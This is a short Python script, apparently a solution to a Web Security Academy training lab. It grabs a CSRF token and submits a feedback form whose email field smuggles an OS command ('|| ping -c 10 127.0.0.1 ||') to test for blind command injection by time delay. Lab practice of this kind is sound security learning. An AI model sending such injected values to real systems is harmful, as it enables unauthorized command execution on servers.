import requests
import sys
import re
from bs4 import BeautifulSoup


s = requests.Session()
feedback_url = 'https://ac651f431ed0e198c0a89b5d003f0018.web-security-academy.net/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

feedback_submit_url = 'https://ac651f431ed0e198c0a89b5d003f0018.web-security-academy.net/feedback/submit'
post_data = {
    'csrf' : csrf,
    'name' : 'hey',
    'email' : 'you@gmail.com|| ping -c 10 127.0.0.1 ||',
    'subject' : 'nada',
    'message' : 'e pues nada'
}
resp = s.post(feedback_submit_url, data=post_data)
print(resp.text)